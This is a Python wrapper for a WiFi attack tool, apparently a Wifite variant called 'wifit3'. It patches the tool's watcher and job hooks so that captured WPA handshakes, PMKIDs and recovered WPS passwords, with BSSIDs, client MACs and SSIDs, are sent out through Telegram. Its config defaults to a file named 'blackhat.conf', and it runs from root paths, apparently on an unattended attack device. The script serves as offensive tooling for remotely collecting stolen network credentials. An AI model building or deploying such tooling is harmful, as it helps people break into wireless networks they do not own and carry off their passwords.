#!/usr/bin/env python3

from __future__ import annotations

import argparse
import logging
import os
import queue
import sys
import threading
import time
from collections.abc import Callable, Hashable, Iterable
from pathlib import Path
from typing import Any


LOGGER = logging.getLogger("telegram_wifit3")
_STOP = object()


def _with_details(prefix: str, details: list[str]) -> str:
    if not details:
        return prefix
    return f"{prefix} ({', '.join(details)})"


def format_psk(bssid: str, psk: str) -> str:
    return f"psk for bssid {bssid} = {psk}"


def format_ap_event(event: Any) -> str | None:
    event_name = type(event).__name__
    bssid = getattr(event, "bssid", None)
    if not bssid:
        return None

    if event_name == "HandshakeCaptured":
        details = []
        pair_label = getattr(event, "pair_label", None)
        client_mac = getattr(event, "client_mac", None)
        ssid = getattr(event, "ssid", None)
        if pair_label:
            details.append(str(pair_label))
        if client_mac:
            details.append(f"client {client_mac}")
        if ssid and ssid != "<hidden>":
            details.append(f"ssid {ssid}")
        return _with_details(f"handshake from bssid {bssid} captured", details)

    if event_name == "PmkidCaptured":
        ssid = getattr(event, "ssid", None)
        details = [f"ssid {ssid}"] if ssid and ssid != "<hidden>" else []
        return _with_details(f"pmkid from bssid {bssid} captured", details)

    if event_name in {"WpsPskRecovered", "WpsPbcPskRecovered"}:
        psk = getattr(event, "psk", None)
        if psk is None:
            return None
        return format_psk(str(bssid), str(psk))

    return None


class TelegramNotifier:
    def __init__(self, sender: Callable[[str], object], max_queue_size: int = 128) -> None:
        self._sender = sender
        self._queue: queue.Queue[object] = queue.Queue(maxsize=max_queue_size)
        self._keys: set[Hashable] = set()
        self._keys_lock = threading.Lock()
        self._closed = False
        self._closed_lock = threading.Lock()
        self._worker = threading.Thread(
            target=self._run,
            name="telegram-wifit3-sender",
            daemon=True,
        )
        self._worker.start()

    def publish(self, message: str, event_key: Hashable | None = None) -> bool:
        key: Hashable = ("message", message) if event_key is None else event_key
        try:
            hash(key)
        except TypeError:
            key = ("unhashable", repr(key))

        with self._closed_lock:
            if self._closed:
                return False
            with self._keys_lock:
                if key in self._keys:
                    return False
                self._keys.add(key)
            try:
                self._queue.put_nowait(message)
            except queue.Full:
                with self._keys_lock:
                    self._keys.discard(key)
                LOGGER.warning("Telegram queue full; notification dropped")
                return False
        return True

    def flush(self, timeout: float = 2.0) -> None:
        deadline = time.monotonic() + max(0.0, timeout)
        with self._queue.all_tasks_done:
            while self._queue.unfinished_tasks:
                remaining = deadline - time.monotonic()
                if remaining <= 0:
                    LOGGER.warning("Timed out waiting for Telegram notifications")
                    return
                self._queue.all_tasks_done.wait(timeout=remaining)

    def close(self) -> None:
        with self._closed_lock:
            if self._closed:
                return
            self._closed = True
        self.flush(timeout=2.0)
        self._queue.put(_STOP)
        self._worker.join(timeout=2.0)

    def _run(self) -> None:
        while True:
            item = self._queue.get()
            try:
                if item is _STOP:
                    return
                try:
                    self._sender(str(item))
                except Exception:
                    LOGGER.exception("Telegram send failed")
            finally:
                self._queue.task_done()


class NullNotifier:
    def publish(self, message: str, event_key: Hashable | None = None) -> bool:
        return False

    def flush(self, timeout: float = 2.0) -> None:
        return None

    def close(self) -> None:
        return None


def _event_key(event: Any) -> tuple[Any, ...]:
    return (
        type(event).__name__,
        getattr(event, "bssid", None),
        getattr(event, "client_mac", None),
        getattr(event, "pair_label", None),
        getattr(event, "psk", None),
        getattr(event, "pmkid", None),
        getattr(event, "key_hex", None),
    )


def _publish_ap_events(notifier: TelegramNotifier | NullNotifier, events: Iterable[Any]) -> None:
    for event in events or ():
        message = format_ap_event(event)
        if message is not None:
            notifier.publish(message, _event_key(event))


def _is_success(status: Any) -> bool:
    return getattr(status, "value", status) == "SUCCESS"


def _publish_successful_job(notifier: TelegramNotifier | NullNotifier, app: Any, job: Any) -> None:
    if not _is_success(getattr(job, "status", None)):
        return
    key = getattr(job, "key", None)
    if not key:
        return
    try:
        bssid = app.vault.manager.job_bssid(job)
    except Exception:
        LOGGER.debug("Could not determine BSSID for completed job", exc_info=True)
        return
    if not bssid:
        return
    notifier.publish(
        format_psk(str(bssid), str(key)),
        ("job", getattr(job, "job_id", None), str(bssid), str(key)),
    )


def install_wifit3_hooks(notifier: TelegramNotifier | NullNotifier) -> Callable[[], None]:
    from wifit3.ui.app import WifiteApp
    from wifit3.watchers.ap_watcher import ApWatcher

    original_poll = ApWatcher.poll
    original_toast_job = WifiteApp._toast_job

    def poll_with_telegram(self: Any, *args: Any, **kwargs: Any) -> Any:
        events = original_poll(self, *args, **kwargs)
        _publish_ap_events(notifier, events)
        return events

    def toast_job_with_telegram(self: Any, job: Any) -> Any:
        _publish_successful_job(notifier, self, job)
        return original_toast_job(self, job)

    ApWatcher.poll = poll_with_telegram
    WifiteApp._toast_job = toast_job_with_telegram

    restored = False

    def restore() -> None:
        nonlocal restored
        if restored:
            return
        ApWatcher.poll = original_poll
        WifiteApp._toast_job = original_toast_job
        restored = True

    return restore


def split_args(argv: list[str] | None = None) -> tuple[argparse.Namespace, list[str]]:
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument(
        "--telegram-config",
        default=os.environ.get("BLACKHAT_CONFIG", "/mnt/blackhat.conf"),
    )
    parser.add_argument(
        "--no-telegram",
        action="store_true",
    )
    return parser.parse_known_args(sys.argv[1:] if argv is None else argv)


def _make_notifier(wrapper_args: argparse.Namespace) -> TelegramNotifier | NullNotifier:
    if wrapper_args.no_telegram:
        return NullNotifier()
    try:
        from telegram import Telegram
    except Exception:
        system_site = "/usr/lib/python3/dist-packages"
        if not os.path.isdir(system_site) or system_site in sys.path:
            LOGGER.exception("Telegram disabled; could not load %s", wrapper_args.telegram_config)
            return NullNotifier()
        sys.path.insert(0, system_site)
        try:
            from telegram import Telegram
        except Exception:
            LOGGER.exception("Telegram disabled; could not load %s", wrapper_args.telegram_config)
            return NullNotifier()

    try:
        telegram = Telegram(wrapper_args.telegram_config)
        return TelegramNotifier(telegram.send)
    except Exception:
        LOGGER.exception("Telegram disabled; could not initialize %s", wrapper_args.telegram_config)
        return NullNotifier()


def _prepare_wifit3_runtime() -> None:
    script_dir = Path(__file__).resolve().parent
    source_candidates = (
        Path("/root/wifit3/src"),
        script_dir / "wifit3-src" / "src",
        script_dir.parent / "wifit3-src" / "src",
    )
    for source_dir in source_candidates:
        source = str(source_dir)
        complete_source = source_dir / "wifit3" / "watchers" / "ap_watcher.py"
        if complete_source.is_file() and source not in sys.path:
            sys.path.insert(0, source)


def _reexec_into_wifit3_venv() -> None:
    runtime = Path("/root/wifit3/.venv/bin/python")
    if not runtime.is_file() or os.environ.get("TELEGRAM_WIFIT3_RUNTIME") == "1":
        return
    if os.path.abspath(sys.executable) == os.path.abspath(str(runtime)):
        return
    os.environ["TELEGRAM_WIFIT3_RUNTIME"] = "1"
    script = str(Path(__file__).resolve())
    os.execv(str(runtime), [str(runtime), script, *sys.argv[1:]])


def main(argv: list[str] | None = None) -> int:
    _prepare_wifit3_runtime()
    wrapper_args, wifit3_args = split_args(argv)
    notifier = _make_notifier(wrapper_args)
    restore: Callable[[], None] | None = None
    original_argv = sys.argv[:]
    try:
        restore = install_wifit3_hooks(notifier)
        sys.argv = [original_argv[0], *wifit3_args]
        from wifit3.__main__ import main as wifit3_main

        result = wifit3_main()
        return int(result or 0)
    finally:
        if restore is not None:
            restore()
        notifier.close()
        sys.argv = original_argv


if __name__ == "__main__":
    _reexec_into_wifit3_venv()
    raise SystemExit(main())

